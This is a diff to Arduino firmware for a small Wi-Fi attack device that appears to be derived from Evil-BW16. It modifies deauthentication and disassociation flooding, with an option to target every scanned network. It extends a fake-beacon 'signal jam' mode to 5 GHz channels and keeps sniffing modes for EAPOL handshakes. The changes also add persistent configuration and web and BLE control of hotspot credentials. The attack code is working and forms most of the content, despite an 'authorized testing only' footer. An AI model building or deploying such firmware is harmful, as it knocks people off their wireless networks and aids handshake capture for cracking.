     tx_success_count = 0;
     tx_fail_count = 0;
     seq_num_counter = 1;
+    blePushStatus();
     Serial.println("[TX STATS] Reset.");
   }
   else if (command == "start sniff") {
+    deauth_sniff_enabled = false;
+    has_sniffed_deauth = false;
     currentMode = SNIFF_ALL;
     startSniffing();
+    blePushStatus();
   }
   else if (command == "hop on") {
+    // 仅开启跳频标志；真正的跳频在 loop() 的 if (isSniffing) 分支里执行。
+    // 不在非嗅探态偷开混杂模式，避免关掉 SoftAP 导致热点死锁。
     isHopping = true;
-    if (!isSniffing) { wifi_on(RTW_MODE_PROMISC); wifi_enter_promisc_mode(); }
+    blePushStatus();
   }
   else if (command == "hop off") {
     isHopping = false;
+    blePushStatus();
   }
   else if (command.startsWith("set ch ")) {
     String chStr = command.substring(7);
@@ -1268,29 +1505,52 @@ void handleCommand(String command) {
       isHopping = false;
       useCustomChannels = false;
       setChannel(newChannel);
+      blePushStatus();
     }
   }
-  else if (command == "sniff beacon") { currentMode = SNIFF_BEACON; startSniffing(); }
-  else if (command == "sniff probe") { currentMode = SNIFF_PROBE; startSniffing(); }
-  else if (command == "sniff deauth") { currentMode = SNIFF_DEAUTH; startSniffing(); }
-  else if (command == "sniff eapol") { currentMode = SNIFF_EAPOL; startSniffing(); }
-  else if (command == "sniff pwnagotchi") { currentMode = SNIFF_PWNAGOTCHI; startSniffing(); }
-  else if (command == "sniff all") { currentMode = SNIFF_ALL; startSniffing(); }
-  else if (command == "stop sniff") { stopSniffing(); }
+  else if (command == "sniff beacon") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_BEACON; startSniffing(); blePushStatus(); }
+  else if (command == "sniff probe") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_PROBE; startSniffing(); blePushStatus(); }
+  else if (command == "sniff deauth") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_DEAUTH; startSniffing(); blePushStatus(); }
+  else if (command == "sniff eapol") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_EAPOL; startSniffing(); blePushStatus(); }
+  else if (command == "sniff pwnagotchi") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_PWNAGOTCHI; startSniffing(); blePushStatus(); }
+  else if (command == "sniff all") { deauth_sniff_enabled = false; has_sniffed_deauth = false; currentMode = SNIFF_ALL; startSniffing(); blePushStatus(); }
+  else if (command == "stop sniff") { stopSniffing(); blePushStatus(); }
   else if (command.startsWith("set ")) {
     String setting = command.substring(4);
     setting.trim();
     int space_index = setting.indexOf(' ');
     if (space_index != -1) {
       String key = setting.substring(0, space_index);
-      String value = setting.substring(space_index + 1);
+      String rawValue = setting.substring(space_index + 1);
+      rawValue.trim();
+      String value = rawValue;
       value.replace(" ", "");
 
-      if (key.equalsIgnoreCase("cycle_delay")) { cycle_delay = value.toInt(); blePushInfo(); }
-      else if (key.equalsIgnoreCase("scan_time")) { scan_time = value.toInt(); blePushInfo(); }
-      else if (key.equalsIgnoreCase("num_frames")) { num_send_frames = value.toInt(); blePushInfo(); }
-      else if (key.equalsIgnoreCase("start_channel")) { start_channel = value.toInt(); blePushInfo(); }
-      else if (key.equalsIgnoreCase("scan_cycles")) { scan_between_cycles = value.equalsIgnoreCase("on"); blePushInfo(); }
+      if (key.equalsIgnoreCase("cycle_delay")) {
+        cycle_delay = value.toInt();
+        saveConfigToFlash();
+        blePushInfo();
+      }
+      else if (key.equalsIgnoreCase("scan_time")) {
+        scan_time = value.toInt();
+        saveConfigToFlash();
+        blePushInfo();
+      }
+      else if (key.equalsIgnoreCase("num_frames")) {
+        num_send_frames = value.toInt();
+        saveConfigToFlash();
+        blePushInfo();
+      }
+      else if (key.equalsIgnoreCase("start_channel")) {
+        start_channel = value.toInt();
+        saveConfigToFlash();
+        blePushInfo();
+      }
+      else if (key.equalsIgnoreCase("scan_cycles")) {
+        scan_between_cycles = value.equalsIgnoreCase("on");
+        saveConfigToFlash();
+        blePushInfo();
+      }
       else if (key.equalsIgnoreCase("led")) {
         USE_LED = value.equalsIgnoreCase("on");
         if (!USE_LED) {
@@ -1298,44 +1558,114 @@ void handleCommand(String command) {
           digitalWrite(LED_G, LOW);
           digitalWrite(LED_B, LOW);
         }
+        saveConfigToFlash();
         blePushInfo();
+      }
+      else if (key.equalsIgnoreCase("ap_ssid")) {
+        if (rawValue.length() >= 1 && rawValue.length() <= 32) {
+          if (String(ap_ssid) != rawValue) {
+            strncpy(ap_ssid, rawValue.c_str(), sizeof(ap_ssid) - 1);
+            ap_ssid[sizeof(ap_ssid) - 1] = '\0';
+            saveConfigToFlash();
+            if (apEnabled && !isSniffing) pendingApRestart = true;
+          }
+          blePushInfo();
+          Serial.println("[CFG] AP SSID updated to: " + String(ap_ssid));
+        } else {
+          Serial.println("[ERROR] AP SSID must be 1..32 bytes");
+        }
+      }
+      else if (key.equalsIgnoreCase("ap_pass")) {
+        if (rawValue.length() >= 8 && rawValue.length() <= 63) {
+          if (String(ap_pass) != rawValue) {
+            strncpy(ap_pass, rawValue.c_str(), sizeof(ap_pass) - 1);
+            ap_pass[sizeof(ap_pass) - 1] = '\0';
+            saveConfigToFlash();
+            if (apEnabled && !isSniffing) pendingApRestart = true;
+          }
+          blePushInfo();
+          Serial.println("[CFG] AP password updated.");
+        } else {
+          Serial.println("[ERROR] AP password must be 8..63 chars (WPA2)");
+        }
+      }
+      else if (key.equalsIgnoreCase("ble_name")) {
+        if (rawValue.length() >= 1 && rawValue.length() <= 26) {
+          updateBleName(rawValue.c_str());
+          saveConfigToFlash();
+          blePushInfo();
+          Serial.println("[CFG] BLE name updated to: " + String(ble_name));
+        } else {
+          Serial.println("[ERROR] BLE name must be 1..26 bytes");
+        }
       }
       else if (key.equalsIgnoreCase("target")) {
         target_aps.clear();
         target_mode = false;
-        int start = 0;
-        int end = 0;
-        while ((end = value.indexOf(',', start)) != -1) {
-          int target_index = value.substring(start, end).toInt();
-          if (target_index >= 0 && target_index < (int)scan_results.size()) {
-            target_aps.push_back(scan_results[target_index]);
-          }
-          start = end + 1;
+        for (size_t i = 0; i < scan_results.size(); i++) {
+          scan_results[i].selected = false;
         }
-        if (start < (int)value.length()) {
-          int target_index = value.substring(start).toInt();
-          if (target_index >= 0 && target_index < (int)scan_results.size()) {
-            target_aps.push_back(scan_results[target_index]);
+        if (value.equalsIgnoreCase("all")) {
+          for (size_t i = 0; i < scan_results.size(); i++) {
+            scan_results[i].selected = true;
+            target_aps.push_back(scan_results[i]);
           }
+          if (!target_aps.empty()) target_mode = true;
+        } else {
+          int start = 0;
+          int end = 0;
+          while ((end = value.indexOf(',', start)) != -1) {
+            int target_index = value.substring(start, end).toInt();
+            if (target_index >= 0 && target_index < (int)scan_results.size()) {
+              scan_results[target_index].selected = true;
+              target_aps.push_back(scan_results[target_index]);
+            }
+            start = end + 1;
+          }
+          if (start < (int)value.length()) {
+            int target_index = value.substring(start).toInt();
+            if (target_index >= 0 && target_index < (int)scan_results.size()) {
+              scan_results[target_index].selected = true;
+              target_aps.push_back(scan_results[target_index]);
+            }
+          }
+          if (!target_aps.empty()) target_mode = true;
         }
-        if (!target_aps.empty()) target_mode = true;
       }
     }
     else if (setting.equalsIgnoreCase("target")) {
       // "set target" with no value -> clear targets, fall back to full mode.
       target_aps.clear();
       target_mode = false;
+      for (size_t i = 0; i < scan_results.size(); i++) {
+        scan_results[i].selected = false;
+      }
     }
   }
+  else if (command.equalsIgnoreCase("reset_config")) {
+    strcpy(ap_ssid, DEFAULT_WIFI_SSID);
+    strcpy(ap_pass, DEFAULT_WIFI_PASS);
+    updateBleName(DEFAULT_BLE_NAME);
+    cycle_delay = 2000;
+    scan_time = 5000;
+    num_send_frames = 3;
+    start_channel = 1;
+    scan_between_cycles = false;
+    USE_LED = true;
+    saveConfigToFlash();
+    blePushInfo();
+    if (apEnabled && !isSniffing) pendingApRestart = true;
+    Serial.println("[CFG] Restored factory default configuration.");
+  }
   else if (command.equalsIgnoreCase("info")) {
-    Serial.println("[INFO] cycle_delay=" + String(cycle_delay) + " scan_time=" + String(scan_time) + " frames=" + String(num_send_frames));
+    Serial.println("[INFO] SSID=" + String(ap_ssid) + " BLE=" + String(ble_name) + " cycle_delay=" + String(cycle_delay) + " scan_time=" + String(scan_time) + " frames=" + String(num_send_frames));
     blePushInfo();
   }
   else if (command.equalsIgnoreCase("help")) {
     Serial.println("Commands: scan, results, start deauther, stop, disassoc, random_attack, attack_time <ms>");
     Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, stop sniff, hop on/off");
-    Serial.println("Config: set cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>");
-    Serial.println("Web: connect to WiFi '" WIFI_SSID "' and open 192.168.1.1 in browser");
+    Serial.println("Config: set ap_ssid/ap_pass/ble_name/cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>, reset_config");
+    Serial.println("Web: connect to WiFi '" + String(ap_ssid) + "' and open 192.168.1.1 in browser");
   }
   else {
     Serial.println("[ERROR] Unknown command: " + command);
@@ -1355,17 +1685,20 @@ void targetAttack() {
         Serial.println(") failed");
         continue;
       }
+      currentChannel = target_aps[i].channel;
       for (unsigned long j = 0; j < num_send_frames; j++) {
         uint16_t reason = deauth_reasons[j % num_deauth_reasons];
-        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, reason);                                                     // broadcast deauth
-        wifi_tx_deauth_frame(target_aps[i].bssid, target_aps[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);      // directed deauth
-        wifi_tx_disassoc_frame(target_aps[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);                // broadcast disassoc
-        wifi_tx_disassoc_frame(target_aps[i].bssid, target_aps[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);    // directed disassoc
+        // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃，
+        // 徒耗 50% 空口时间
+        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, reason);
+        wifi_tx_disassoc_frame(target_aps[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
         delay(1);
       }
     }
-    // Return to the AP's own channel so the phone keeps its connection.
-    wifi_set_channel(WIFI_CHANNEL);
+    // 仅在 WebUI SoftAP 开启时回切至热点信道以维持网页连接
+    if (apEnabled) {
+      wifi_set_channel(WIFI_CHANNEL);
+    }
     if (USE_LED) digitalWrite(LED_B, LOW);
   }
 }
@@ -1389,18 +1722,19 @@ void attackCycle() {
         continue;
       }
       currentCh = targetChannel;
+      currentChannel = targetChannel;
     }
     for (unsigned long j = 0; j < num_send_frames; j++) {
       uint16_t reason = deauth_reasons[j % num_deauth_reasons];
-      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, reason);                                                   // broadcast deauth
-      wifi_tx_deauth_frame(scan_results[i].bssid, scan_results[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);  // directed deauth
-      wifi_tx_disassoc_frame(scan_results[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);              // broadcast disassoc
-      wifi_tx_disassoc_frame(scan_results[i].bssid, scan_results[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);// directed disassoc
+      // 仅发 AP -> Broadcast 的有效帧
+      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, reason);
+      wifi_tx_disassoc_frame(scan_results[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
       delay(1);
     }
   }
-  // Return to the AP's own channel so the phone keeps its connection.
-  wifi_set_channel(WIFI_CHANNEL);
+  if (apEnabled) {
+    wifi_set_channel(WIFI_CHANNEL);
+  }
   if (USE_LED) digitalWrite(LED_B, LOW);
   Serial.println("Attack cycle completed.");
 }
@@ -1409,6 +1743,7 @@ void attackCycle() {
 // Web Client Handler
 //==========================================================
 void handleWebClient() {
+  if (!apEnabled) return;  // ap off 后 WebServer 已关闭，避免操作已 end 的 server
   WiFiClient client = webServer.available();
   if (!client || !client.connected()) return;
 
@@ -1509,6 +1844,30 @@ void handleWebClient() {
   else if (path == "/api/config" && method == "POST") {
     String body = parseBody(request);
     String result = "";
+    if (body.indexOf("ap_ssid=") >= 0) {
+      String newSsid = getPostValue(body, "ap_ssid");
+      newSsid.trim();
+      if (newSsid.length() >= 1 && newSsid != String(ap_ssid)) {
+        handleCommand("set ap_ssid " + newSsid);
+        result += "ap_ssid updated ";
+      }
+    }
+    if (body.indexOf("ap_pass=") >= 0) {
+      String newPass = getPostValue(body, "ap_pass");
+      newPass.trim();
+      if (newPass.length() >= 8 && newPass != String(ap_pass)) {
+        handleCommand("set ap_pass " + newPass);
+        result += "ap_pass updated ";
+      }
+    }
+    if (body.indexOf("ble_name=") >= 0) {
+      String newBle = getPostValue(body, "ble_name");
+      newBle.trim();
+      if (newBle.length() >= 1 && newBle != String(ble_name)) {
+        handleCommand("set ble_name " + newBle);
+        result += "ble_name updated ";
+      }
+    }
     if (body.indexOf("cycle_delay=") >= 0) {
       handleCommand("set cycle_delay " + getPostValue(body, "cycle_delay"));
       result += "cycle_delay updated ";
@@ -1658,13 +2017,16 @@ body{background:#1a1a2e;color:#e0e0e0;font-family:-apple-system,sans-serif;paddi
 <button class="btn btn-dark" onclick="sendCmd('hop off')">📺 信道跳频关</button>
 </div>
 <div class="page" id="page-config">
+<div class="config-row"><span class="config-label">BLE 蓝牙名称</span><input class="config-input" style="width:140px" type="text" maxlength="26" id="cfgBleName" value="WiFi-Deck"></div>
+<div class="config-row"><span class="config-label">WiFi 热点名称</span><input class="config-input" style="width:140px" type="text" maxlength="32" id="cfgApSsid" value="WiFi-Deck"></div>
+<div class="config-row"><span class="config-label">WiFi 热点密码</span><input class="config-input" style="width:140px" type="text" maxlength="63" id="cfgApPass" value="12345678"></div>
 <div class="config-row"><span class="config-label">攻击间隔 (ms)</span><input class="config-input" type="number" id="cfgCycleDelay" value="2000"></div>
 <div class="config-row"><span class="config-label">扫描时间 (ms)</span><input class="config-input" type="number" id="cfgScanTime" value="5000"></div>
 <div class="config-row"><span class="config-label">每AP帧数</span><input class="config-input" type="number" id="cfgNumFrames" value="3"></div>
 <div class="config-row"><span class="config-label">起始信道</span><input class="config-input" type="number" id="cfgStartChannel" value="1"></div>
 <div class="config-row"><span class="config-label">循环间扫描</span><select class="config-input" id="cfgScanCycles"><option value="off">关</option><option value="on">开</option></select></div>
 <div class="config-row"><span class="config-label">LED 指示</span><select class="config-input" id="cfgLed"><option value="on">开</option><option value="off">关</option></select></div>
-<button class="btn btn-primary" onclick="saveConfig()">💾 保存配置</button>
+<button class="btn btn-primary" onclick="saveConfig()">💾 保存配置 (掉电记忆)</button>
 <hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
 <div class="stat-card"><div class="stat-val" id="cfgUptime">--</div><div class="stat-label">运行时间</div></div>
 <div class="footer">WiFi-Deck | Based on 7h30th3r0n3/Evil-BW16<br>⚠️ For educational and authorized testing only</div>
@@ -1677,15 +2039,15 @@ function showPage(p){document.querySelectorAll('.tab').forEach((t,i)=>t.classLis
 function toast(msg){let t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000);}
 async function fetchJSON(url,opts={}){try{let r=await fetch(url,opts);return await r.json();}catch(e){toast('Network error');return null;}}
 async function doScan(){document.getElementById('scanLoading').classList.add('show');document.getElementById('netList').innerHTML='';selectedIndices.clear();await fetchJSON(API+'/scan',{method:'POST'});scanCache=await fetchJSON(API+'/scan');if(scanCache){toast('扫描完成: '+scanCache.count+' 个网络');renderNetworksData(scanCache);}document.getElementById('scanLoading').classList.remove('show');}
-function renderNetworks(){if(scanCache){renderNetworksData(scanCache);}else{fetchJSON(API+'/scan').then(d=>{if(d){scanCache=d;renderNetworksData(d);}});}}
+function renderNetworks(){if(scanCache){renderNetworksData(scanCache);}else{fetchJSON(API+'/scan').then(d=>{if(d){scanCache=d;selectedIndices.clear();d.networks.forEach(n=>{if(n.selected)selectedIndices.add(n.index);});renderNetworksData(d);updateAttackStats();}});}}
 function renderNetworksData(data){let html='';data.networks.forEach(n=>{let pct=Math.max(0,Math.min(100,n.rssi+120));let cls=pct>60?'good':(pct>35?'mid':'bad');let bandCls=n.channel>=36?'band5':'band24';let bandTxt=n.channel>=36?'5G':'2.4G';let sel=selectedIndices.has(n.index)?'selected':'';html+=`<div class="net-item ${sel}" onclick="toggleNet(${n.index})"><div class="net-info"><div class="net-ssid">${escHtml(n.ssid||'(隐藏)')}</div><div class="net-meta">CH:${n.channel} BSSID:${n.bssid} RSSI:${n.rssi}dBm <span class="net-band ${bandCls}">${bandTxt}</span></div><div class="bar"><div class="bar-fill ${cls}" style="width:${pct}%"></div></div></div><div class="net-check"></div></div>`;});if(!html)html='<p style="text-align:center;color:#666;padding:20px">暂无扫描结果，请先扫描</p>';document.getElementById('netList').innerHTML=html;}
 function toggleNet(idx){if(selectedIndices.has(idx))selectedIndices.delete(idx);else selectedIndices.add(idx);renderNetworksData(scanCache||{networks:[]});updateAttackStats();}
 async function setTargets(){let indices=Array.from(selectedIndices).join(',');let data=await fetchJSON(API+'/target?indices='+indices,{method:'POST'});if(data){toast('已设置 '+data.targets+' 个目标');return true;}return false;}function startAttack(cmd){setTargets().then(()=>sendCmd(cmd));}function singleApAttack(){if(selectedIndices.size===0){toast('请先在扫描页选择一个目标');return;}let firstIdx=Array.from(selectedIndices)[0];sendCmd('single_ap '+firstIdx);}function escHtml(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));}
 async function sendCmd(cmd){let data=await fetchJSON(API+'/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd='+encodeURIComponent(cmd)});if(data)toast('已执行: '+cmd);}
 async function timedAttack(){let ms=prompt('攻击持续时间(ms):','10000');if(ms&&parseInt(ms)>0){await setTargets();sendCmd('attack_time '+ms);}}
 async function updateAttackStats(){document.getElementById('statTargets').textContent=selectedIndices.size;let data=await fetchJSON(API+'/status');if(data){document.getElementById('statNets').textContent=data.scan_count;let dot=document.getElementById('statusDot');dot.className='status-dot';if(data.attack_enabled||data.disassoc_enabled||data.beacon_flood||data.probe_flood||data.signal_jam||data.deauth_sniff)dot.classList.add('attacking');else if(data.sniffing)dot.classList.add('active');let s=Math.floor(data.uptime/1000);let m=Math.floor(s/60);let h=Math.floor(m/60);document.getElementById('cfgUptime').textContent=h+'h '+(m%60)+'m';}}
-async function saveConfig(){let body='cycle_delay='+document.getElementById('cfgCycleDelay').value;body+='&scan_time='+document.getElementById('cfgScanTime').value;body+='&num_frames='+document.getElementById('cfgNumFrames').value;body+='&start_channel='+document.getElementById('cfgStartChannel').value;body+='&scan_cycles='+document.getElementById('cfgScanCycles').value;body+='&led='+document.getElementById('cfgLed').value;let data=await fetchJSON(API+'/config',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});if(data)toast('配置已保存');}
-async function initStatus(){let data=await fetchJSON(API+'/info');if(data){document.getElementById('cfgCycleDelay').value=data.cycle_delay;document.getElementById('cfgScanTime').value=data.scan_time;document.getElementById('cfgNumFrames').value=data.num_frames;document.getElementById('cfgStartChannel').value=data.start_channel;document.getElementById('cfgScanCycles').value=data.scan_between_cycles?'on':'off';document.getElementById('cfgLed').value=data.led?'on':'off';}}
+async function saveConfig(){let pass=document.getElementById('cfgApPass').value.trim();if(pass.length<8){toast('WiFi 密码至少需要 8 位');return;}let body='ble_name='+encodeURIComponent(document.getElementById('cfgBleName').value.trim());body+='&ap_ssid='+encodeURIComponent(document.getElementById('cfgApSsid').value.trim());body+='&ap_pass='+encodeURIComponent(pass);body+='&cycle_delay='+document.getElementById('cfgCycleDelay').value;body+='&scan_time='+document.getElementById('cfgScanTime').value;body+='&num_frames='+document.getElementById('cfgNumFrames').value;body+='&start_channel='+document.getElementById('cfgStartChannel').value;body+='&scan_cycles='+document.getElementById('cfgScanCycles').value;body+='&led='+document.getElementById('cfgLed').value;let data=await fetchJSON(API+'/config',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});if(data)toast('配置已保存至 Flash');}
+async function initStatus(){let data=await fetchJSON(API+'/info');if(data){if(data.ble_name)document.getElementById('cfgBleName').value=data.ble_name;if(data.ssid)document.getElementById('cfgApSsid').value=data.ssid;if(data.pass)document.getElementById('cfgApPass').value=data.pass;document.getElementById('cfgCycleDelay').value=data.cycle_delay;document.getElementById('cfgScanTime').value=data.scan_time;document.getElementById('cfgNumFrames').value=data.num_frames;document.getElementById('cfgStartChannel').value=data.start_channel;document.getElementById('cfgScanCycles').value=data.scan_between_cycles?'on':'off';document.getElementById('cfgLed').value=data.led?'on':'off';}}
 window.onload=()=>{renderNetworks();initStatus();setInterval(()=>{if(document.getElementById('page-attack').classList.contains('active'))updateAttackStats();},3000);};
 </script>
 </body>
@@ -1697,10 +2059,12 @@ window.onload=()=>{renderNetworks();initStatus();setInterval(()=>{if(document.ge
 void setup() {
   Serial.begin(115200);
 
+  loadConfigFromFlash();
+
+  pinMode(LED_R, OUTPUT);
+  pinMode(LED_G, OUTPUT);
+  pinMode(LED_B, OUTPUT);
   if (USE_LED) {
-    pinMode(LED_R, OUTPUT);
-    pinMode(LED_G, OUTPUT);
-    pinMode(LED_B, OUTPUT);
     digitalWrite(LED_R, HIGH); delay(100); digitalWrite(LED_R, LOW);
     digitalWrite(LED_G, HIGH); delay(100); digitalWrite(LED_G, LOW);
     digitalWrite(LED_B, HIGH); delay(100); digitalWrite(LED_B, LOW);
@@ -1712,7 +2076,7 @@ void setup() {
   // Start AP in non-hidden mode so phones can discover it
   startSoftAP();
 
-  Serial.println("[INFO] AP started: " WIFI_SSID);
+  Serial.println("[INFO] AP started: " + String(ap_ssid));
   Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
   Serial.println("[INFO] Web server started on port 80");
 
@@ -1726,6 +2090,12 @@ void setup() {
 // Main Loop
 //==========================================================
 void loop() {
+  // BLE 异常掉线复位：连接断开后若未收到 CCCD 取消订阅回调，bleNotifyEnabled 会残留为 true，
+  // 导致对不存在的连接反复 notify
+  if (bleNotifyEnabled && !BLE.connected(activeConnId)) {
+    bleNotifyEnabled = false;
+  }
+
   // Handle commands from Serial
   if (Serial.available()) {
     String command = Serial.readStringUntil('\n');
@@ -1739,8 +2109,22 @@ void loop() {
     handleCommand(cmd);
   }
 
-  // Handle web clients
-  handleWebClient();
+  // Handle web clients (throttled to 25ms to reduce lwIP non-blocking accept overhead)
+  static unsigned long lastWebPoll = 0;
+  if (millis() - lastWebPoll >= 25) {
+    lastWebPoll = millis();
+    handleWebClient();
+  }
+
+  // Deferred SoftAP restart after SSID/Password change (allows BLE notify / HTTP 200 to flush first)
+  if (pendingApRestart) {
+    pendingApRestart = false;
+    if (apEnabled && !isSniffing) {
+      delay(50);
+      startSoftAP();
+      Serial.println("[INFO] SoftAP restarted with new credentials: " + String(ap_ssid));
+    }
+  }
 
   // Timed Attack check
   checkTimedAttack();
@@ -1782,15 +2166,17 @@ void loop() {
           Serial.println(") failed");
           continue;
         }
+        currentChannel = aps_to_attack[i].channel;
         for (unsigned long j = 0; j < num_send_frames; j++) {
           uint16_t reason = disassoc_reasons[j % num_disassoc_reasons];
-          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, reason);                    // broadcast
-          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, aps_to_attack[i].bssid, reason);     // directed to AP
+          // 仅发 AP -> Broadcast 的有效帧
+          wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, reason);
           delay(1);
         }
       }
-      // Return to the AP's own channel so the phone keeps its connection.
-      wifi_set_channel(WIFI_CHANNEL);
+      if (apEnabled) {
+        wifi_set_channel(WIFI_CHANNEL);
+      }
       if (USE_LED) digitalWrite(LED_B, LOW);
       Serial.println("[DISASSOC] Attack cycle completed.");
     }
@@ -1841,9 +2227,16 @@ void loop() {
   //===============================
   if (signal_jam_enabled && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
     last_signal_jam = millis();
-    int totalChs = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
+    // 合并轮询 2.4G + 5G 全信道，避免 Signal Jam 只干扰 2.4GHz
+    static const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
+    static const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
+    int totalChs = num2G + num5G;
     signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;
-    currentChannel = CHANNELS_2GHZ[signal_jam_ch_index];
+    if (signal_jam_ch_index < num2G) {
+      currentChannel = CHANNELS_2GHZ[signal_jam_ch_index];
+    } else {
+      currentChannel = CHANNELS_5GHZ[signal_jam_ch_index - num2G];
+    }
     wifi_set_channel(currentChannel);
     for (int j = 0; j < 3; j++) {
       uint8_t fakeBSSID[6];
@@ -1870,7 +2263,6 @@ void loop() {
     isSniffing = false;
     for (unsigned long j = 0; j < num_send_frames; j++) {
       wifi_tx_deauth_frame(sniffed_deauth_src, dst_mac, deauth_reasons[j % num_deauth_reasons]);
-      wifi_tx_deauth_frame(sniffed_deauth_src, sniffed_deauth_src, disassoc_reasons[j % num_disassoc_reasons]);
       delay(1);
     }
     has_sniffed_deauth = false;
